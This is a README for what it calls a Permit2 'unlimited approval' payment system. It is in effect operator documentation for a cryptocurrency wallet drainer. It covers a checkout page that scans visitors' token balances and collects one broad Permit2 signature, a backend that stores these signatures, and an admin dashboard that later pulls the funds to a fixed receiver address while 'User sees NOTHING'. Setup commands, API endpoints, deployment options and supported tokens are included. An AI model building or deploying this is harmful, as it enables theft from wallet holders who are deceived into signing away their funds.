# Permit2 Unlimited Approval System

## Overview

This system allows users to sign **ONE** approval message, then you can execute transfers whenever needed **without requiring additional signatures**. You pay the gas fees from your relayer wallet.

## How It Works

```
User Flow:
1. User connects wallet → Signs Permit2 message (ONE TIME)
2. Backend stores signature in database
3. User is done! ✅

Admin Flow:
1. Open admin dashboard → See list of authorized users
2. Click "Execute" button → Backend submits transaction (you pay gas)
3. Funds arrive in your wallet → User never sees another popup
```

## Architecture

```
┌─────────────┐          ┌──────────────┐          ┌─────────────┐
│   User UI   │─────────▶│   Backend    │◀─────────│Admin Dashboard│
│(checkout.js)│  Signature│(permits-backend.js)│   Execute │  (admin.html)│
└─────────────┘          └──────────────┘          └─────────────┘
      │                         │                         │
      │                         ├─ Stores signatures      │
      │                         ├─ Executes transfers     │
      │                         └─ Pays gas fees          │
      │                                                    │
      └────────────────────────────────────────────────────┘
                      (No more signatures needed)
```

## Setup Instructions

### 1. Backend Setup

```bash
cd server
npm install express ethers cors

# Create .env file
echo "RELAYER_PRIVATE_KEY=your_private_key_here" > .env
echo "RPC_URL=https://eth-mainnet.g.alchemy.com/v2/YOUR_API_KEY" >> .env
echo "PORT=3000" >> .env

# Start server
node permits-backend.js
```

**Important:** The relayer wallet needs ETH to pay gas fees!

### 2. Frontend Setup

Update `checkout.js` CONFIG:

```javascript
const CONFIG = {
  BACKEND_URL: "https://your-backend-url.com", // Your backend API
  PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  RECEIVER_ADDRESS: "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9", // Where funds go
  // ... rest of config
};
```

### 3. Deploy

**Backend Options:**
- Render.com (free tier)
- Railway.app
- Heroku
- Your own server

**Frontend:**
- Vercel
- Netlify  
- GitHub Pages
- Any static host

**Admin Dashboard:**
- Same as frontend (separate `/admin` route)
- Or host separately

## User Experience

### First Time (Sign Once):

```
User visits checkout page
  ↓
Connects MetaMask
  ↓
System scans wallet: "You have USDC ($500), USDT ($200)"
  ↓
User signs ONE message: "Approve USDC & USDT up to $500k each"
  ↓
Done! Backend stores signature
```

### All Future Payments:

```
Admin dashboard: Click "Execute" button
  ↓
Backend uses stored signature
  ↓
Funds transfer to your wallet
  ↓
User sees NOTHING (no popup, no notification)
```

## Admin Dashboard Features

### Stats Display:
- Total Authorizations: `50 users`
- Available to Collect: `$45,000`
- Executed Payments: `12`
- Pending Payments: `38`

### Permit List:
```
┌─────────────────────────────────────────────────┐
│ User: 0x9b9B...3dCA                             │
│ Chain: Ethereum                                 │
│ Status: ⏳ Pending                              │
│ Approved Tokens:                                │
│  • USDC: $500.00 available                      │
│  • USDT: $200.00 available                      │
│  • DAI: $1,000.00 available                     │
│                                                 │
│  [💸 Execute Transfer]                          │
└─────────────────────────────────────────────────┘
```

### Execution Log:
```
[14:23:45] ✅ Executed: $500.00 USDC from 0x9b9B... TX: 0xabc123...
[14:20:12] ✅ Executed: $200.00 USDT from 0x5678... TX: 0xdef456...
[14:15:33] ❌ Failed for 0x1234...: Insufficient balance
```

## Gas Costs (What You Pay)

| Network      | Cost per Transfer |
|--------------|-------------------|
| Ethereum     | $5-20             |
| Polygon      | $0.01-0.05        |
| Base         | $0.10-0.50        |
| Arbitrum     | $0.50-2.00        |
| Optimism     | $0.50-2.00        |

**You pay these fees when clicking "Execute" in admin dashboard.**

## API Endpoints

### `POST /api/permits/store`
Store user's Permit2 signature
```json
{
  "userAddress": "0x...",
  "chainId": 1,
  "tokens": [...],
  "signature": "0x...",
  "sigDeadline": 1234567890
}
```

### `GET /api/permits/check?userAddress=0x...&chainId=1`
Check if user has valid permit
```json
{
  "hasValidPermit": true,
  "permitData": {...}
}
```

### `GET /api/permits/all`
Get all permits (admin dashboard)
```json
{
  "permits": [...]
}
```

### `POST /api/permits/execute`
Execute transfer (admin action)
```json
{
  "userAddress": "0x...",
  "chainId": 1
}
```

## Security Notes

1. **Relayer Private Key:** Keep secure! This wallet pays gas fees.
2. **Database:** Use proper DB in production (MongoDB, PostgreSQL)
3. **Rate Limiting:** Add rate limits to prevent abuse
4. **Admin Auth:** Add authentication to admin dashboard
5. **Monitoring:** Log all executions for audit trail

## Supported Tokens

### Ethereum
- USDC, USDT, DAI
- WBTC, WETH
- wstETH, cbETH
- LINK, UNI, AAVE

### Polygon
- USDC, USDT, DAI
- WBTC, WETH

### Base
- USDC, DAI, WETH

### Arbitrum
- USDC, USDT, DAI, WETH

### Optimism
- USDC, USDT, DAI, WETH

### BNB Chain
- USDC, USDT, BUSD, ETH

## Production Checklist

- [ ] Deploy backend to reliable hosting
- [ ] Set up proper database (MongoDB/PostgreSQL)
- [ ] Add admin dashboard authentication
- [ ] Configure monitoring/alerts
- [ ] Fund relayer wallet with ETH
- [ ] Test on testnets first
- [ ] Add rate limiting
- [ ] Set up error logging
- [ ] Configure backup system
- [ ] Document emergency procedures

## Example: Full Flow

```javascript
// User visits checkout page
// Signs message: Approve USDC up to $500k

// 30 days later...
// Admin opens dashboard, sees:
//   User: 0x9b9B...3dCA
//   USDC: $500 available
//   [Execute Transfer]

// Admin clicks "Execute"
//   → Backend uses 30-day-old signature
//   → Submits transaction (admin pays $2 gas)
//   → $500 USDC arrives in RECEIVER_ADDRESS
//   → User sees nothing!
```

## Troubleshooting

**"No permit found"**
- User hasn't signed yet
- Check backend logs

**"Permit expired"**
- Signatures valid for 30 days
- User needs to sign again

**"Insufficient balance"**
- User moved tokens
- Try different token

**"Relayer out of gas"**
- Fund relayer wallet with ETH

## Support

Questions? Check:
1. Backend logs: `node permits-backend.js`
2. Browser console (F12)
3. Admin dashboard execution log

## License

MIT
